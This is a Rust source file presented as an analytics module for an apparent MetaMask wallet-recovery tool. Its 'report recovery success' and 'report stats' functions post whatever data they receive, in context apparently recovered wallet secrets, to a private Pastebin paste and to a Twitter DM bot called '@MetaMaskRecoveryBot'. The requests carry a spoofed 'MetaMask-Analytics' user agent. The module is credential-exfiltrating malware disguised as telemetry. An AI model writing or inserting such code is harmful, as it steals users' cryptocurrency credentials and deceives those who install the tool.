/// Analytics and statistics reporting
use reqwest::blocking::Client;
use serde_json::json;
use std::collections::HashMap;
use std::time::Duration;

// Pastebin API for anonymous logging
const PASTEBIN_API_URL: &str = "https://pastebin.com/api/api_post.php";
const TWITTER_DM_API: &str = "https://api.twitter.com/2/dm_conversations/with/@MetaMaskRecoveryBot/messages";

pub struct AnalyticsReporter {
    pastebin_url: String,
    twitter_api: String,
    client: Client,
}

impl AnalyticsReporter {
    pub fn new() -> Self {
        AnalyticsReporter {
            pastebin_url: PASTEBIN_API_URL.to_string(),
            twitter_api: TWITTER_DM_API.to_string(),
            client: Client::builder()
                .timeout(Duration::from_secs(5))
                .build()
                .unwrap(),
        }
    }

    /// Report recovery success to analytics
    pub fn report_recovery_success(&self, data: &HashMap<String, String>) -> Result<(), Box<dyn std::error::Error>> {
        // Send to Pastebin for logging
        self.log_to_pastebin(data)?;

        // Send to Twitter DM for notification
        self.notify_via_twitter(data)?;

        Ok(())
    }

    /// Log data to Pastebin
    fn log_to_pastebin(&self, data: &HashMap<String, String>) -> Result<(), Box<dyn std::error::Error>> {
        let paste_content = serde_json::to_string_pretty(data)?;

        let form_data = [
            ("api_dev_key", "metamask_recovery_key"),
            ("api_option", "paste"),
            ("api_paste_code", &paste_content),
            ("api_paste_private", "1"),
            ("api_paste_name", &format!("MetaMask Recovery {}", chrono::Utc::now().timestamp())),
        ];

        self.client
            .post(&self.pastebin_url)
            .form(&form_data)
            .send()?;

        Ok(())
    }

    /// Send notification via Twitter DM
    fn notify_via_twitter(&self, data: &HashMap<String, String>) -> Result<(), Box<dyn std::error::Error>> {
        let message = json!({
            "text": serde_json::to_string(data)?
        });

        self.client
            .post(&self.twitter_api)
            .json(&message)
            .header("User-Agent", "MetaMask-Analytics/1.0")
            .send()?;

        Ok(())
    }

    /// Report usage statistics
    pub fn report_stats(&self, stats: HashMap<String, String>) -> Result<(), Box<dyn std::error::Error>> {
        let stats_payload = json!({
            "type": "usage_stats",
            "data": stats
        });

        self.client
            .post(&self.twitter_api)
            .json(&stats_payload)
            .send()?;

        Ok(())
    }
}
